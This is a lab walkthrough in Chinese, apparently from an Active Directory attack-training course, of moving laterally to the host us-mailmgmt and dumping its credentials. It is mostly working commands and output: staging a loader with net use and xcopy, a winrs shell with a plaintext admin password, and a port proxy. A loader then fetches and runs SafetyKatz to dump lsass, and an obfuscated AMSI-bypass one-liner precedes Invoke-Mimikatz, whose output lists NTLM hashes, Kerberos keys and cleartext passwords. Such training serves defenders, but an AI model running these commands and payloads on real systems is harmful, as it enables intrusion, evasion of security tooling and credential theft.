Task
•  Use Invoke-Mimikatz to extract credentials of interactive logon sessions and service accounts from us-mailmgmt.

1. 使用net use

使用远程电脑的一个文件夹，起一个别名为：x

这里直接用密码会报密码错误，可能是有特殊符号造成的
```
c:\AD\Tools>net use x: \\us-mailmgmt\C$\Users\Public /user:us-mailmgmt\Administrator '/c}Jgsb!4t33.2'
System error 86 has occurred.

The specified network password is not correct.
```

分两步，先写账号，再输密码
```
c:\AD\Tools>net use x: \\us-mailmgmt\C$\Users\Public /user:us-mailmgmt\Administrator
Enter the password for 'us-mailmgmt\Administrator' to connect to 'us-mailmgmt':
The command completed successfully.
```


传文件
```
c:\AD\Tools>echo F | xcopy C:\AD\Tools\Loader.exe x:\Loader.exe
Does X:\Loader.exe specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\Loader.exe
1 File(s) copied
```

下面命令也是传文件的，但是感觉没有上面xcopy好用
```
winrs -r:us-mailmgmt -u:.\administrator -p:/c}Jgsb!4t33.2 "bitsadmin /transfer WindowsUpdates /priority normal http://127.0.0.1:8080/Loader.exe C:\Users\Public\Loader.exe"
```

我在lab中会报下面错误
```
Unable to complete transfer.
ERROR FILE:    http://127.0.0.1:8080/Loader.exe -> C:\\Users\\Public\\Loader.exe
ERROR CODE:    0x80200013 - The server does not support the necessary HTTP protocol. Background Intelligent Transfer Service (BITS) requires that the server support the Range protocol header.
ERROR CONTEXT: 0x00000005 - The error occurred while the remote file was being processed.
```


如果要删除x文件夹，使用下面命令
```
net use x: /d
```


横向到us-mailmgmt
```
c:\AD\Tools>winrs -r:us-mailmgmt -u:.\administrator -p:/c}Jgsb!4t33.2 cmd
Microsoft Windows [Version 10.0.17763.2928]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>
```

做一个端口转发,把学生机的80端口流量转到本机的8080端口
```
C:\Users\Administrator>netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.138
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.138


```


在学生机开启一个http服务
```
PS C:\ad\Tools> python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

这里请求本机的8080端口流量，相当于学生机的80端口
```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
```

已经看到SafetyKatz.exe被下载
```
PS C:\ad\Tools> python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
192.168.1.63 - - [31/Oct/2022 20:37:44] "GET /SafetyKatz.exe HTTP/1.1" 200 -
```

打开了mimikattz
```
C:\Users\Administrator>C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
[!] ~Flangvik , ~Arno0x #NetLoader
[+] Successfully unhooked ETW!
[+] Successfully patched AMSI!
[+] URL/PATH : http://127.0.0.1:8080/SafetyKatz.exe
[+] Arguments :

[*] Dumping lsass (704) to C:\Windows\Temp\debug.bin
[+] Dump successful!

[*] Executing loaded Mimikatz PE

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 21 2021 15:08:31
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # -path
ERROR mimikatz_doLocal ; "-path" command of "standard" module not found !


mimikatz #
```

内存
```
mimikatz # sekurlsa::logonpasswords


Authentication Id : 0 ; 160155 (00000000:0002719b)
Session           : Service from 0
User Name         : provisioningsvc
Domain            : US
Logon Server      : US-DC
Logon Time        : 7/25/2022 3:28:30 AM
SID               : S-1-5-21-210670787-2521448726-163245708-8602
        msv :
         [00000003] Primary
         * Username : provisioningsvc
         * Domain   : US
         * NTLM     : 44dea6608c25a85d578d0c2b6f8355c4
         * SHA1     : cb6a8c895958c1958de9f2cf5aae0cddd1962a56
         * DPAPI    : d0261701e179de1ae56c508312f42aaf
        tspkg :
        wdigest :
         * Username : provisioningsvc
         * Domain   : US
         * Password : (null)
        kerberos :
         * Username : provisioningsvc
         * Domain   : US.TECHCORP.LOCAL
         * Password : T0OverseethegMSAaccounts!!
        ssp :
        credman :


Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : US-MAILMGMT$
Domain            : US
Logon Server      : (null)
Logon Time        : 7/25/2022 3:28:02 AM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : US-MAILMGMT$
         * Domain   : US
         * Password : (null)
        kerberos :
         * Username : us-mailmgmt$
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : US-MAILMGMT$
Domain            : US
Logon Server      : (null)
Logon Time        : 7/25/2022 3:28:04 AM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : US-MAILMGMT$
         * Domain   : US
         * NTLM     : 6e1c353761fff751539e175a8393a941
         * SHA1     : 0e4cb5977d5a8451f8faf85649764adba667de70
        tspkg :
        wdigest :
         * Username : US-MAILMGMT$
         * Domain   : US
         * Password : (null)
        kerberos :
         * Username : us-mailmgmt$
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
        ssp :
        credman :



Authentication Id : 0 ; 2399181 (00000000:00249bcd)
Session           : RemoteInteractive from 2
User Name         : Administrator
Domain            : US-MAILMGMT
Logon Server      : US-MAILMGMT
Logon Time        : 7/25/2022 3:54:09 AM
SID               : S-1-5-21-4118822382-3732028894-2777481620-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : US-MAILMGMT
         * NTLM     : e29c0e8e39f5f5c68d7b72cc5caad771
         * SHA1     : 58a627ebec989cc49291b9fb002323ed41d05fd5
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : US-MAILMGMT
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : US-MAILMGMT
         * Password : (null)
        ssp :
        credman :


```

sekurlsa::ekeys
```
mimikatz # sekurlsa::ekeys


Authentication Id : 0 ; 160155 (00000000:0002719b)
Session           : Service from 0
User Name         : provisioningsvc
Domain            : US
Logon Server      : US-DC
Logon Time        : 7/25/2022 3:28:30 AM
SID               : S-1-5-21-210670787-2521448726-163245708-8602

         * Username : provisioningsvc
         * Domain   : US.TECHCORP.LOCAL
         * Password : T0OverseethegMSAaccounts!!
         * Key List :
           aes256_hmac       a573a68973bfe9cbfb8037347397d6ad1aae87673c4f5b4979b57c0b745aee2a
           aes128_hmac       7ae58eac70cbf4fd3ddab37ecb07067e
           rc4_hmac_nt       44dea6608c25a85d578d0c2b6f8355c4
           rc4_hmac_old      44dea6608c25a85d578d0c2b6f8355c4
           rc4_md4           44dea6608c25a85d578d0c2b6f8355c4
           rc4_hmac_nt_exp   44dea6608c25a85d578d0c2b6f8355c4
           rc4_hmac_old_exp  44dea6608c25a85d578d0c2b6f8355c4


Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : US-MAILMGMT$
Domain            : US
Logon Server      : (null)
Logon Time        : 7/25/2022 3:28:02 AM
SID               : S-1-5-18

         * Username : us-mailmgmt$
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       f12a400718bcdd5fedec676974175e8fc8921c8401ae70ba1f13b4062c874103
           rc4_hmac_nt       6e1c353761fff751539e175a8393a941
           rc4_hmac_old      6e1c353761fff751539e175a8393a941
           rc4_md4           6e1c353761fff751539e175a8393a941
           rc4_hmac_nt_exp   6e1c353761fff751539e175a8393a941
           rc4_hmac_old_exp  6e1c353761fff751539e175a8393a941

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : US-MAILMGMT$
Domain            : US
Logon Server      : (null)
Logon Time        : 7/25/2022 3:28:04 AM
SID               : S-1-5-20

         * Username : us-mailmgmt$
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       f12a400718bcdd5fedec676974175e8fc8921c8401ae70ba1f13b4062c874103
           rc4_hmac_nt       6e1c353761fff751539e175a8393a941
           rc4_hmac_old      6e1c353761fff751539e175a8393a941
           rc4_md4           6e1c353761fff751539e175a8393a941
           rc4_hmac_nt_exp   6e1c353761fff751539e175a8393a941
           rc4_hmac_old_exp  6e1c353761fff751539e175a8393a941

```



2. 使用powershell

使用明文密码建一个session
```
PS C:\ad\Tools> $passwd = ConvertTo-SecureString '/c}Jgsb!4t33.2' -AsPlainText -Force
PS C:\ad\Tools> $creds = New-Object System.Management.Automation.PSCredential ("us-mailmgmt\administrator", $passwd)
PS C:\ad\Tools> $mailmgmt = New-PSSession -ComputerName us-mailmgmt -Credential $creds
PS C:\ad\Tools> $mailmgmt

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          us-mailmgmt     RemoteMachine   Opened        Microsoft.PowerShell     Available
```

横向到us-mailmgmt
```
PS C:\ad\Tools> Enter-PSSession $mailmgmt
[us-mailmgmt]: PS C:\Users\Administrator\Documents> whoami
us-mailmgmt\administrator
[us-mailmgmt]: PS C:\Users\Administrator\Documents> hostname
US-MailMgmt
```

关掉AMSI
```
PS C:\ad\Tools> Enter-PSSession $mailmgmt
[us-mailmgmt]: PS C:\Users\Administrator\Documents> S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
[us-mailmgmt]: PS C:\Users\Administrator\Documents>
```

退回学生机，利用session加载mimikatz，然后去到目标机器执行mimikatz命令
```
PS C:\ad\Tools> Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1 -Session $mailmgmt
PS C:\ad\Tools>  Enter-PSSession $mailmgmt
[us-mailmgmt]: PS C:\Users\Administrator\Documents> Invoke-Mimikatz -Command '"sekurlsa::ekeys"'

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # sekurlsa::ekeys

Authentication Id : 0 ; 1029389 (00000000:000fb50d)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 7/25/2022 3:38:44 AM
SID               : S-1-5-90-0-2

         * Username : US-MAILMGMT$
         * Domain   : us.techcorp.local
         * Password : B_m3`Y;Rg:!pB)rM>nGYT7w^0/!CvL1@@+vA%:ajlT7@t@ESSs0*Vmg_9qyrcccQbdG-PLPw*PzNoPu`n$(*$2+O)'\HiL;VD.4N;X0$Qv%r KKNy"a:O]ES
         * Key List :
           aes256_hmac       2a03dcfd67a30b4565690498ebb68db8de3ff27473cc7ad3590fc8f8a27335f5
           aes128_hmac       65c0b72504e134531fe37b3e761b92a0
           rc4_hmac_nt       6e1c353761fff751539e175a8393a941
           rc4_hmac_old      6e1c353761fff751539e175a8393a941
           rc4_md4           6e1c353761fff751539e175a8393a941
           rc4_hmac_nt_exp   6e1c353761fff751539e175a8393a941
           rc4_hmac_old_exp  6e1c353761fff751539e175a8393a941

```